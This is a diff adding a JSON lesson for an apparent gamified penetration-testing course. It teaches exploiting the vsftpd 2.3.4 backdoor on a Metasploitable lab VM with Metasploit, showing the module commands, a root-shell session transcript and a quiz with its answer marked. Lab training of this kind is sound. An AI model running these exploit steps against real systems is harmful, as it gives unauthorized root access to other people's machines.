@@ -1,0 +1,86 @@
+{
+    "id": "l3",
+    "chapterId": "ch_7",
+    "title": "Exploiting with Metasploit: Step-by-Step 🎯",
+    "description": "Walk through a real exploit against Metasploitable using vsftpd backdoor.",
+    "xpReward": 40,
+    "estimatedMinutes": 12,
+    "section": "Exploitation",
+    "slides": [
+        {
+            "id": "s_l3_1",
+            "type": "text",
+            "title": "Target: vsftpd 2.3.4 Backdoor 🚪",
+            "content": "# The Scenario\n\nWe previously scanned Metasploitable and identified:\n- Port 21 open\n- Service: **vsftpd 2.3.4**\n\nThis specific version contains a **backdoor** triggered by a smiley face `:)` in the username. The backdoor opens a shell on port **6200**.\n\n**Metasploit Module**: `exploit/unix/ftp/vsftpd_234_backdoor`\n\n**Goal**: Use Metasploit to trigger the backdoor and get a command shell on the target."
+        },
+        {
+            "id": "s_l3_2",
+            "type": "code",
+            "title": "Step 1: Search and Select 🔍",
+            "content": "Find the appropriate exploit module.",
+            "codeSnippet": "msf6 > search vsftpd\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor\n\nmsf6 > use 0\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) >",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l3_3",
+            "type": "text",
+            "title": "Step 2: View Options and Set Target ⚙️",
+            "content": "# Configuring the Exploit\n\n```bash\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options\n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s)\n   RPORT   21               yes       The target port (TCP)\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101\nRHOSTS => 192.168.56.101\n```\n\n**Note**: There's no `LHOST` required for this module because the backdoor opens a shell on the **target's** port 6200, not a reverse connection."
+        },
+        {
+            "id": "s_l3_4",
+            "type": "quiz",
+            "title": "Module Options 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_1",
+                "type": "multiple_choice",
+                "question": "In Metasploit, what does `RHOSTS` typically represent?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The IP address of the attacking machine.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The remote target IP address or range.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The port to listen on for a reverse shell.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The password for the service.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "RHOSTS is the Remote Host(s) to target.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_5",
+            "type": "code",
+            "title": "Step 3: Run the Exploit 🚀",
+            "content": "Execute the module and watch for the shell.",
+            "codeSnippet": "msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\n\n[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.56.101:21 - USER: 331 Please specify the password.\n[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...\n[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.56.102:45123 -> 192.168.56.101:6200)\n\nwhoami\nroot\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n**Success!** We have a root shell on the target."
+        },
+        {
+            "id": "s_l3_6",
+            "type": "text",
+            "title": "Understanding What Happened 🔬",
+            "content": "# Behind the Scenes\n\n1.  Metasploit connected to FTP port 21.\n2.  It sent the username containing `:)` followed by any password.\n3.  The backdoored vsftpd service opened a **listening shell on port 6200**.\n4.  Metasploit automatically connected to that port and gave us interactive access.\n\n**Critical Observation**: The shell we received is **root**. This is a **privileged** foothold. We own the box completely.\n\n**To exit the shell**: Press `Ctrl+C` and type `y` to abort session, or type `exit` in the shell. The session will still be listed in `sessions -l` as backgrounded."
+        },
+        {
+            "id": "s_l3_7",
+            "type": "warning",
+            "title": "Session Management ⚠️",
+            "content": "## Don't Lose Your Shell!\n\nIf you accidentally close the terminal, you lose the shell. Always use `background` (`Ctrl+Z`) to keep the session alive in Metasploit.\n\n```bash\n# Background current session\nCtrl+Z\n\n# List sessions\nsessions -l\n\n# Resume session 1\nsessions -i 1\n```"
+        }
+    ]
+}
